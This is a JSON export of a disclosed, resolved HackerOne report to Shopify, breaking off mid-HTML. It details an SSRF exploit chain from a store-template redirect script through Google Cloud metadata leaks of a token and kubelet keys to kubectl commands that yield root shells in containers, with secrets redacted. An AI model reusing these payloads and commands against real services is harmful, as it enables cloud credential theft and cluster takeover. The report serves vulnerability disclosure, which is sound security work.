{"id":341876,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE4NzY=","url":"https://hackerone.com/reports/341876","title":"SSRF in Exchange leads to ROOT access in all instances","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-04-22T23:39:53.445Z","submitted_at":"2018-04-22T23:39:53.445Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xacb","url":"/0xacb","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-05-23T21:09:28.855Z","bug_reporter_agreed_on_going_public_at":"2018-05-23T21:09:28.755Z","team_member_agreed_on_going_public_at":"2018-05-23T20:59:54.217Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## The Exploit Chain - How to get root access on all Shopify instances\n\n### 1 - Access Google Cloud Metadata\n- 1: Create a store (partners.shopify.com)\n- 2: Edit the template `password.liquid` and add the following content:\n\n```html\n\u003cscript\u003e\nwindow.location=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\";\n// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.\n\u003c/script\u003e\n```\n\n- 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app\n- 4: Wait for the store screenshot to appear on the Create Listing page\n- 5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)\n\n{F289082}\n\nExploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to \"bypass\" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.\n\nI tried to leak more data, but the web screenshot software wasn't producing any images for `application/text` responses. However, I found that I could add the parameter `alt=json` to force `application/json` responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (`█████`), the instance name and more:\n\n```html\n\u003cscript\u003e\nwindow.location=\"http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json\";\n\u003c/script\u003e\n```\n{F289081}\n\n**Can I add my SSH key using the leaked token? No**\n\n```bash\ncurl -X POST \"https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata\" -H \"Authorization: Bearer ██████████████\" -H \"Content-Type: application/json\" --data '{\"items\": [{\"key\": \"0xACB\", \"value\": \"test\"}]}'\n```\n```json\n{\n \"error\": {\n  \"errors\": [\n   {\n    \"domain\": \"global\",\n    \"reason\": \"forbidden\",\n    \"message\": \"Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/███████'\"\n   },\n   {\n    \"domain\": \"global\",\n    \"reason\": \"forbidden\",\n    \"message\": \"Required 'iam.serviceAccounts.actAs' permission for 'projects/███████'\"\n   }\n  ],\n  \"code\": 403,\n  \"message\": \"Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/████████'\"\n }\n}\n```\n\nI checked the scopes for this token and there was no read/write access to the Compute Engine API:\n```bash\ncurl \"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████\"\n```\n```json\n{\n \"issued_to\": \"███████\",\n \"audience\": \"███\",\n \"scope\": \"https://www.googleapis.com/auth/cloud-platform\",\n \"expires_in\": 1307,\n \"access_type\": \"offline\"\n}\n```\n\n### 2 - Dumping kube-env\n\nI created a new store and pulled attributes from this instance recursively: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true\u0026alt=json\n\nResult:\n{F289455}\n\n**Metadata concealment** (https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment) is not enabled, so the `kube-env` attribute is available.\n\nSince the image is cropped, I made a new request to: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json in order to see the rest of the Kubelet certificate and the Kubelet private key.\n\nResult:\n{F289456}\n\n**ca.crt**\n```\n-----BEGIN CERTIFICATE-----\n██████\n███████\n███████\n████████\n██████████████\n████████\n████████\n███████\n████\n██████\n███\n█████████\n████\n████\n████████\n███████\n███\n-----END CERTIFICATE-----\n```\r\n\n**client.crt**\n```\n-----BEGIN CERTIFICATE-----\n█████\n███████\n██████\n████████\n██████████\n█████\n██████\n█████\n█████\n██████████\n███████\n█████\n████\n████\n████████\n████████\n-----END CERTIFICATE-----\n```\n\n**client.pem**\n```\n-----BEGIN RSA PRIVATE KEY-----\n█████████\n██████\n████████\n████\n████\n█████████\n██████████\n██████\n████████\n█████████\n██████\n██████████\n███\n██████████\n███\n██████\n█████████\n████████\n██████████\n█████████\n████\n████\n████████\n████\n███████\n-----END RSA PRIVATE KEY-----\n```\n\n**MASTER_NAME**: █████\n\n### 3 - Using Kubelet to execute arbitrary commands\n\nIt's possible to list all pods {F289460}:\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces\n\nNAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE\n████████                    ██████████                    1/1    \n```\n\nAnd create new pods as well:\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml\n\npod \"shell-demo\" created\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo\n\npod \"shell-demo\" deleted\n```\n\nI didn't tried to delete running pods, obviously, I'm not sure if I would be able to delete them with user `████████`. However, it's not possible to execute commands in this new pod or any other pod:\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash\n\nError from server (Forbidden): pods \"shell-demo\" is forbidden: User \"███\" cannot create pods/exec in the namespace \"default\": Unknown user \"███\"\n```\r\n\nThe `get secrets` command doesn't work, but it's possible to describe a given pod and the get the secret using its name. That's how I leaked the kubernetes.io service account token using the instance `████` from the namespace `████`:\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████\n\nName:           ████████\nNamespace:      ██████\nNode:           ██████████\nStart Time:     Fri, 23 Mar 2018 13:53:13 +0000\nLabels:         █████\n                ████\n                █████\nAnnotations:    \u003cnone\u003e\nStatus:         Running\nIP:             █████████\nControlled By:  █████\nContainers:\n  default-http-backend:\n    Container ID:   docker://███\n    Image:          ██████\n    Image ID:       docker-pullable://█████\n    Port:           ████/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Sun, 22 Apr 2018 03:23:09 +0000\n    Last State:     Terminated\n      Reason:       Error\n      Exit Code:    2\n      Started:      Fri, 20 Apr 2018 23:39:21 +0000\n      Finished:     Sun, 22 Apr 2018 03:23:07 +0000\n    Ready:          True\n    Restart Count:  180\n    Limits:\n      cpu:     10m\n      memory:  20Mi\n    Requests:\n      cpu:        10m\n      memory:     20Mi\n    Liveness:     http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3\n    Environment:  \u003cnone\u003e\n    Mounts:\n      ██████\nConditions:\n  Type           Status\n  Initialized    True\n  Ready          True\n  PodScheduled   True\nVolumes:\n ██████████:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName: ███████\n    Optional:    false\nQoS Class:       Guaranteed\nNode-Selectors:  \u003cnone\u003e\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\n                 node.kubernetes.io/unreachable:NoExecute for 300s\nEvents:          \u003cnone\u003e\n```\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml\n\napiVersion: v1\ndata:\n  ca.crt: ██████████\n  namespace: ████\n  token: ██████████==\nkind: Secret\nmetadata:\n  annotations:\n    kubernetes.io/service-account.name: default\n    kubernetes.io/service-account.uid: ████\n  creationTimestamp: 2017-01-23T16:08:19Z\n  name:█████\n  namespace: ██████████\n  resourceVersion: \"115481155\"\n  selfLink: /api/v1/namespaces/████████/secrets/████\n  uid: █████████\ntype: kubernetes.io/service-account-token\n```\n\nAnd finally, it's possible to use this token to get a shell in any container:\n```bash\n$ kubectl --certificate-authority ca.crt --server https://████ --token \"█████.██████.███\" exec -it w█████████ -- /bin/bash\n\nDefaulting container name to web.\nUse 'kubectl describe pod/w█████████' to see all of the containers in this pod.\n███████:/# id\nuid=0(root) gid=0(root) groups=0(root)\n█████:/# ls\napp  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\n███████:/# exit\n```\n\n```bash\n$ kubectl --certificate-authority ca.crt --server https://███████ --token \"█████.██████.█████████\" exec -it ████████ -n ████████ -- /bin/bash\n\nDefaulting container name to web.\nUse 'kubectl describe pod/█████ -n █████' to see all of the containers in this pod.\nroot@████:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@████:/# ls\napp  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\nroot@█████:/# exit\n```\n\n---\n*Huge thanks to [Luís Maia](https://www.linkedin.com/in/luis-maia-7714023a) [0xfad0](http://hackerone.com/0xfad0), for helping me build this █████*\n\n## Impact\n\n**CRITICAL**\n\nThe hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**Can internal services be reached bypassing network access control?**\nYes\n\n**What internal services were accessible?**\nGoogle Cloud Metadata\n\n**Security Impact**\nRCE\n\n","vulnerability_information_html":"\u003ch2 id=\"the-exploit-chain-how-to-get-root-access-on-all-shopify-instances\"\u003eThe Exploit Chain - How to get root access on all Shopify instances\u003c/h2\u003e\n\n\u003ch3 id=\"1-access-google-cloud-metadata\"\u003e1 - Access Google Cloud Metadata\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003e1: Create a store (partners.shopify.com)\u003c/li\u003e\n\u003cli\u003e2: Edit the template \u003ccode\u003epassword.liquid\u003c/code\u003e and add the following content:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttp://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// iframes don\u0026#39;t work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e3: Go to \u003ca title=\"https://exchange.shopify.com/create-a-listing\" href=\"/redirect?url=https%3A%2F%2Fexchange.shopify.com%2Fcreate-a-listing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://exchange.shopify.com/create-a-listing\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and install the Exchange app\u003c/li\u003e\n\u003cli\u003e4: Wait for the store screenshot to appear on the Create Listing page\u003c/li\u003e\n\u003cli\u003e5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e{F289082}\u003c/p\u003e\n\n\u003cp\u003eExploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to \u0026quot;bypass\u0026quot; it while reading the documentation: the \u003ccode\u003e/v1beta1\u003c/code\u003e endpoint is still available, does not require the \u003ccode\u003eMetadata-Flavor: Google\u003c/code\u003e header and still returns the same token.\u003c/p\u003e\n\n\u003cp\u003eI tried to leak more data, but the web screenshot software wasn\u0026#39;t producing any images for \u003ccode\u003eapplication/text\u003c/code\u003e responses. However, I found that I could add the parameter \u003ccode\u003ealt=json\u003c/code\u003e to force \u003ccode\u003eapplication/json\u003c/code\u003e responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (\u003ccode\u003e█████\u003c/code\u003e), the instance name and more:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttp://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e{F289081}\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eCan I add my SSH key using the leaked token? No\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"nt\"\u003e-X\u003c/span\u003e POST \u003cspan class=\"s2\"\u003e\u0026quot;https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Authorization: Bearer ██████████████\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Content-Type: application/json\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026quot;items\u0026quot;: [{\u0026quot;key\u0026quot;: \u0026quot;0xACB\u0026quot;, \u0026quot;value\u0026quot;: \u0026quot;test\u0026quot;}]}\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;errors\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"w\"\u003e\n   \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;domain\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;global\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;reason\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;forbidden\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Required \u0026#39;compute.projects.setCommonInstanceMetadata\u0026#39; permission for \u0026#39;projects/███████\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n   \u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n   \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;domain\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;global\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;reason\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;forbidden\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Required \u0026#39;iam.serviceAccounts.actAs\u0026#39; permission for \u0026#39;projects/███████\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n   \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;code\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e403\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Required \u0026#39;compute.projects.setCommonInstanceMetadata\u0026#39; permission for \u0026#39;projects/████████\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI checked the scopes for this token and there was no read/write access to the Compute Engine API:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s2\"\u003e\u0026quot;https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;issued_to\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;███████\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;audience\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;███\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;scope\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https://www.googleapis.com/auth/cloud-platform\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;expires_in\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1307\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;access_type\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;offline\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"2-dumping-kube-env\"\u003e2 - Dumping kube-env\u003c/h3\u003e\n\n\u003cp\u003eI created a new store and pulled attributes from this instance recursively: \u003ca title=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true\u0026amp;alt=json\" href=\"/redirect?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1beta1%2Finstance%2Fattributes%2F%3Frecursive%3Dtrue%26alt%3Djson\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true\u0026amp;alt=json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eResult:\u003cbr\u003e\n{F289455}\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eMetadata concealment\u003c/strong\u003e (\u003ca title=\"https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment\" href=\"/redirect?url=https%3A%2F%2Fcloud.google.com%2Fkubernetes-engine%2Fdocs%2Fhow-to%2Fmetadata-concealment\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) is not enabled, so the \u003ccode\u003ekube-env\u003c/code\u003e attribute is available.\u003c/p\u003e\n\n\u003cp\u003eSince the image is cropped, I made a new request to: \u003ca title=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json\" href=\"/redirect?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1beta1%2Finstance%2Fattributes%2Fkube-env%3Falt%3Djson\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in order to see the rest of the Kubelet certificate and the Kubelet private key.\u003c/p\u003e\n\n\u003cp\u003eResult:\u003cbr\u003e\n{F289456}\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eca.crt\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e-----BEGIN CERTIFICATE-----\n██████\n███████\n███████\n████████\n██████████████\n████████\n████████\n███████\n████\n██████\n███\n█████████\n████\n████\n████████\n███████\n███\n-----END CERTIFICATE-----\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eclient.crt\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e-----BEGIN CERTIFICATE-----\n█████\n███████\n██████\n████████\n██████████\n█████\n██████\n█████\n█████\n██████████\n███████\n█████\n████\n████\n████████\n████████\n-----END CERTIFICATE-----\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eclient.pem\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e-----BEGIN RSA PRIVATE KEY-----\n█████████\n██████\n████████\n████\n████\n█████████\n██████████\n██████\n████████\n█████████\n██████\n██████████\n███\n██████████\n███\n██████\n█████████\n████████\n██████████\n█████████\n████\n████\n████████\n████\n███████\n-----END RSA PRIVATE KEY-----\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eMASTER_NAME\u003c/strong\u003e: █████\u003c/p\u003e\n\n\u003ch3 id=\"3-using-kubelet-to-execute-arbitrary-commands\"\u003e3 - Using Kubelet to execute arbitrary commands\u003c/h3\u003e\n\n\u003cp\u003eIt\u0026#39;s possible to list all pods {F289460}:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--client-certificate\u003c/span\u003e client.crt \u003cspan class=\"nt\"\u003e--client-key\u003c/span\u003e client.pem \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://██████ get pods \u003cspan class=\"nt\"\u003e--all-namespaces\u003c/span\u003e\n\nNAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE\n████████                    ██████████                    1/1    \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd create new pods as well:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--client-certificate\u003c/span\u003e client.crt \u003cspan class=\"nt\"\u003e--client-key\u003c/span\u003e client.pem \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://████████ create \u003cspan class=\"nt\"\u003e-f\u003c/span\u003e https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml\n\npod \u003cspan class=\"s2\"\u003e\u0026quot;shell-demo\u0026quot;\u003c/span\u003e created\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--client-certificate\u003c/span\u003e client.crt \u003cspan class=\"nt\"\u003e--client-key\u003c/span\u003e client.pem \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://██████████ delete pod shell-demo\n\npod \u003cspan class=\"s2\"\u003e\u0026quot;shell-demo\u0026quot;\u003c/span\u003e 